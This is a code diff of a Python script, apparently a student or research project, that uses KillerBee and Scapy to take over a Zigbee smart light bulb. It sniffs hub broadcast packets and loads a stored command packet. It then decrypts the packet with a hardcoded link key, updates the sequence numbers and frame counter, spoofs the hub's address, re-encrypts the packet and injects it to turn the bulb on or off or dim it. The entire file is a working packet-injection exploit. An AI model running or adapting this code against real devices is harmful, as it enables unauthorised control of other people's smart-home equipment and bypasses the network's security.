@@ -11,10 +11,10 @@ __author__ = 'Soteria'
 # 6. Encrypt the data with the keyc1
 # 7. Inject!
 
-
+import dill  # In order to save and load packet from file
+import PrintHelper
 import logging
 log_killerbee = logging.getLogger('scapy.killerbee')
-
 import struct
 try:
 	from scapy.all import *
@@ -25,159 +25,135 @@ except ImportError:
 
 from killerbee import *
 from killerbee.scapy_extensions import *
-
+import InjectionHelper
 del hexdump
 from scapy.utils import hexdump				# Force using Scapy's hexdump()
 import os
 
 
+# STATIC DEFAULTS:
+TARGET_DEVICE_ID = "45BA" # "F973" # light bulb to be hacked
 DEFAULT_KB_CHANNEL = 11
 DEFAULT_KB_DEVICE = '10.10.10.2'
 SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
-
-# FAULY_TARGET_DEVICE_ID = '0x055f' # old faulty light bulb to be hacked
-TARGET_DEVICE_ID = '0xf973' # light bulb to be hacked
-
-DEFAULT_ZIGBEE_APP_LAYER_COUNTER = 28
-DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM = 61
-TURN_ON_COMMAND_CODE = '\x01'
-TURN_OFF_COMMAND_CODE = '\x00'
-
+command_packet_file = "command_packet_format"
+dim_packet_file = "dim_packet_format"
+TURN_ON_COMMAND_CODE = 1
+TURN_OFF_COMMAND_CODE = 0
+DEFAULT_COMMAND = TURN_ON_COMMAND_CODE
+LEVEL_CONTROL_CLUSTER = 8
+ON_OFF_CLUSTER = 6
+DEFAULT_CLUSTER = ON_OFF_CLUSTER
+LOW_DIM_VALUE = '\x03\x0f\x00'
+HIGH_DIM_VALUE = '\xff\x0f\x00'
 LINK_KEY = '\xdf\x42\xb5\x95\x6a\x2b\xbd\x46\x18\x8d\x59\x0a\xdb\x04\xb6\x09'
-#LINK_KEY = 'df42b5956a2bbd46188d590adb04b609'
+revealing_speed = 0.01
+
+# DYNAMIC DEFAULTS:
+DEFAULT_LAST_ZIGBEE_APP_LAYER_COUNTER = 163
+DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM = 15
+
+
+command = DEFAULT_COMMAND
+cluster_type = DEFAULT_CLUSTER
+if len(sys.argv) < 2:
+    print "No command specified, turning on"
+else:
+    user_input_command = sys.argv.pop(1)
+    if len(sys.argv) == 2:
+        user_input_command_arg = sys.argv.pop(1)
+    if (user_input_command.lower()) == "on":
+        command = TURN_ON_COMMAND_CODE
+        print "Command: Turn on"
+    elif user_input_command.lower() == "off":
+        command = TURN_OFF_COMMAND_CODE
+        print "Command: Turn off"
+    elif user_input_command.lower() == "dim":
+        cluster_type = LEVEL_CONTROL_CLUSTER
+        command = TURN_OFF_COMMAND_CODE
+        if (user_input_command_arg.lower() == "down"):
+            dim_value = LOW_DIM_VALUE
+            print "Command: Dim down"
+        elif (user_input_command_arg.lower() == "up"):
+            dim_value = HIGH_DIM_VALUE
+            print "Command: Dim up"
+
 
 
 # Sniff packets to a list, print it to screen and extract data:
+print "Sniffing broadcast packets..."
 found_hub_link_status = False
 while not found_hub_link_status:
-    packetsList = kbtshark(channel = DEFAULT_KB_CHANNEL, count = 1,iface = DEFAULT_KB_DEVICE, store = 1)
-    print ""
+    packetsList = kbsniff(channel = DEFAULT_KB_CHANNEL, count = 1, iface = DEFAULT_KB_DEVICE, store = 1)
     lastPacket = packetsList[0]
     if (lastPacket.payload.fields['src_addr'] == 0):
         found_hub_link_status = True
+        print "Found packet from hub with sequence number " + str(lastPacket.fields['seqnum'])
 
 
 # Load command packet from file:
-object_to_save = lastPacket
+if cluster_type == ON_OFF_CLUSTER:
+    encrypted_command_packet = dill.load(open(command_packet_file))
+else:
+    encrypted_command_packet = dill.load(open(dim_packet_file))
 
-import dill
-command_packet_file = "command_packet_format"
-
-# Save object
-#dill.dump(object_to_save, open(command_packet_file, "w"))
-
-# Delete object:
-#del object_to_save
-
-# Load object:
-loaded_object = dill.load(open(command_packet_file))
-
-encrypted_command_packet = loaded_object
-#temp
-
-#hexdump(encrypted_command_packet)
-#decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
-#hexdump(decrypted_command_packet_payload)
-# myPayload = decrypted_command_packet_payload.payload.fields['load']
-#hexdump(myPayload)
-#encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 3)
-#hexdump(encrypted_command_packet_to_inject.fields['data'])
-
-## END Load command packet from file
-
-
-# TEMP CODE: Check encryption:
-
-#dec_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
-#enc_packet = kbencrypt(encrypted_command_packet, dec_packet_payload, key = LINK_KEY, verbose = 3)
-#enc_packet.payload.payload.payload.fields['data'] = enc_packet.payload.payload.payload.fields['data'][:-6]
-#print enc_packet.payload.payload.payload.fields['data']
-#dec_packet_payload_chopped = kbdecrypt(enc_packet, key = LINK_KEY, verbose = 3)
-#dec_packet_payload_chopped.show()
-
-# END OF TEMP
+# Save packet
+#dill.dump(lastPacket, open(command_packet_file, "w"))
 
 
 
-# Decrypt packet
-# kbdecrypt(pkt, key = None, verbose = None):
-decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
-packet_load = decrypted_command_packet_payload.payload.fields['load']
-print ""
-print "Original ZCL: " + packet_load.encode("hex")
-cluster_seq_num_hex = struct.pack('<b', DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM)
-
-# Commenting the next line to preserve the entire ZCL bytes:
-#decrypted_command_packet_payload.payload.fields['load'] = packet_load[:1] + cluster_seq_num_hex + packet_load[2:3]
-decrypted_command_packet_payload.payload.fields['load'] = packet_load[:1] + cluster_seq_num_hex + packet_load[2:]
-
-print "ZCL after fixing it: " + decrypted_command_packet_payload.payload.fields['load'].encode("hex")
+# Extracting the MIC from the packet payload:
+encrypted_command_packet.mic = encrypted_command_packet.payload.payload.payload.fields['data'][-6:-2]
+# Omitting the data by 6 (to get rid of the FCS + MIC):
+encrypted_command_packet.payload.payload.payload.fields['data'] = encrypted_command_packet.payload.payload.payload.fields['data'][:-6]
+print "Payload is encrypted!"
+print "Decrypting message..."
+print "Encrypted: " + encrypted_command_packet.payload.payload.payload.fields['data'].encode('hex')
+decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 0)
+PrintHelper.reaviling_string("Decrypted: ", decrypted_command_packet_payload.do_build().encode('hex'), 0.006)
 print ""
 
-# Update Application support layer seq num:
-next_zigbee_cluster_seq_num = DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM
-next_zigbee_app_layer_counter = DEFAULT_ZIGBEE_APP_LAYER_COUNTER
-decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_layer_counter
-
+# Load sequence numbers from last broadcast packet:
 ieee_seq_num = lastPacket.fields['seqnum']
+zigbeeNWK_seq_num = lastPacket.getlayer(ZigbeeNWK).fields['seqnum']
+zigbee_frame_counter = lastPacket.getlayer(ZigbeeSecurityHeader).fields['fc']
 
-ieee_data_layer = lastPacket.payload
-ieee_panID = ieee_data_layer.fields['dest_panid']
-
-zigbeeNWK_layer = lastPacket.getlayer(ZigbeeNWK)
-zigbeeNWK_seq_num = zigbeeNWK_layer.fields['seqnum']
-
-zigbee_security_layer = lastPacket.getlayer(ZigbeeSecurityHeader)
-zigbee_frame_counter = zigbee_security_layer.fields['fc']
-
-
-# Print last broadcast packet sequence numbers
-print ""
-print "Last sync packet sequence numbers:"
-print "--------------"
-print 'IEEE 802.15.4 sequence number = ' + str(ieee_seq_num)
-print 'IEEE 802.15.4 PAN ID = ' + hex(ieee_panID)
-print 'Zigbee NWK sequence number = ' + str(zigbeeNWK_seq_num)
-print 'Zigbee frame counter = ' + str(zigbee_frame_counter)
-print ""
 
 # Advance injected packet sequence numbers
 next_ieee_seq_num = ieee_seq_num + 1
 next_zigbeeNWK_seq_num = zigbeeNWK_seq_num + 2
 next_zigbee_frame_counter = zigbee_frame_counter + 1
+next_zigbee_app_counter = DEFAULT_LAST_ZIGBEE_APP_LAYER_COUNTER + 1
+next_zigbee_cluster_seq_num = DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM + 1
 
 
 
-# Update command packet sequence numbers:
+# Update fields upon crafted sequence numbers:
 encrypted_command_packet.fields['seqnum'] = next_ieee_seq_num
-#encrypted_command_packet.payload.fields['dest_panid'] = ieee_panID
 encrypted_command_packet.getlayer(ZigbeeNWK).fields['seqnum'] = next_zigbeeNWK_seq_num
 encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigbee_frame_counter
+encrypted_command_packet.payload.fields['dest_addr'] = int(TARGET_DEVICE_ID,16)
+encrypted_command_packet.payload.payload.fields['destination'] = int(TARGET_DEVICE_ID,16)
 
+# Update command fields:
+if cluster_type == ON_OFF_CLUSTER:
+    decrypted_command_packet_payload.payload.fields['transaction_sequence'] = next_zigbee_cluster_seq_num
+    decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_counter
+    decrypted_command_packet_payload.payload.fields['command_identifier'] = command
+    decrypted_command_packet_payload.fields['cluster'] = cluster_type
+else:
+    decrypted_command_packet_payload.fields['load'] = decrypted_command_packet_payload.fields['load'][:-4] + dim_value
 
+#decrypted_command_packet_payload.payload.fields['disable_default_response'] = 0
 
-#decrypted_command_packet_payload.payload.payload.fields['seqnum'] = next_zigbee_cluster_seq_num
-# Encrypt packet
-encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 3)
+print "Decrypted payload to inject: " + decrypted_command_packet_payload.do_build().encode('hex')
 
-# Manual edit of the final packet:
-# Adding the mic in the end plus remove the bytes after the encrypted payload:
-mic = encrypted_command_packet_to_inject.getlayer(ZigbeeSecurityHeader).fields['mic']
-hex_mic = str(hex(mic))
-encrypted_command_packet_to_inject.getlayer(ZigbeeSecurityHeader).fields['mic'] = hex_mic
-
-import staticData
-staticData.MY_HEX_MIC = hex_mic
-
-#hex_mic = hex(mic).split('x')[1]
-#print "Hex Mic is " + str(hex_mic)
-#encrypted_command_packet_to_inject.getlayer(ZigbeeSecurityHeader).fields['mic'] = str(hex_mic)
-
-#final_packet = encrypted_command_packet_to_inject[:-10] + hex_mic
+sys.stdout.write("Encrypting message...")
+encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 0)
+sys.stdout.write("\rEncrypting message... DONE!  " + encrypted_command_packet_to_inject.payload.payload.payload.fields['data'].encode('hex'))
 print ""
-print "Final packet to inject:"
-encrypted_command_packet_to_inject.show()
 
-# Send encrypted command
-#kbsendp(pkt, channel = None, inter = 0, loop = 0, iface = None, count = None, verbose = None, realtime=None):
+
+PrintHelper.print_string_as_packet("Injecting packet with data", encrypted_command_packet_to_inject.do_build().encode('hex'))
+print ""
 kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 1, verbose = 3)
